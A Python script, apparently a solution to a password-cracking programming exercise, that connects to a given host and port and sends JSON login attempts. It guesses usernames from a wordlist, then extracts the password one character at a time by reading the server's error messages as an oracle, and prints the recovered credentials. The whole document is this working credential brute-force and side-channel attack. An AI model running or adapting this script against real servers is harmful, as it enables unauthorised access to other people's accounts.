import socket
import sys
import itertools
import json
import string

with open("logins.txt") as f:
    logins = f.read().splitlines()

args = sys.argv
hostname = args[1]
port = int(args[2])

sock = socket.socket()
sock.connect((hostname, port))

symbols_list = list(string.ascii_letters) + list(string.digits)


def receive_response(msg):
    msg = (json.dumps(msg)).encode()
    sock.send(msg)
    response = (sock.recv(10240)).decode()
    response = json.loads(response)
    return response


wrong_login_msg = {"result": "Wrong login!"}
exception_msg = {"result": "Exception happened during login"}
success_msg = {"result": "Connection success!"}

result = wrong_login_msg
message = {"login": " ", "password": " "}

prefix = ""

#  find login
while result == wrong_login_msg:
    for lg in itertools.product(logins):
        login = "".join(lg)
        message["login"] = login
        result = receive_response(message)
        if result != wrong_login_msg:
            break

#  find the first letter of the password
for symbol in itertools.product(symbols_list):
    prefix = "".join(symbol)
    message["password"] = prefix
    result = receive_response(message)
    if result == exception_msg:
        break

#  find the rest of the password
prefix = [prefix]
while result != success_msg:
    for first, second in itertools.product(prefix, symbols_list):
        password = ''.join([first, second])
        message["password"] = password
        result = receive_response(message)
        if result == exception_msg:
            prefix = [password]
            break
        elif result == success_msg:
            print(json.dumps(message, indent=4))
            sock.close()
            break
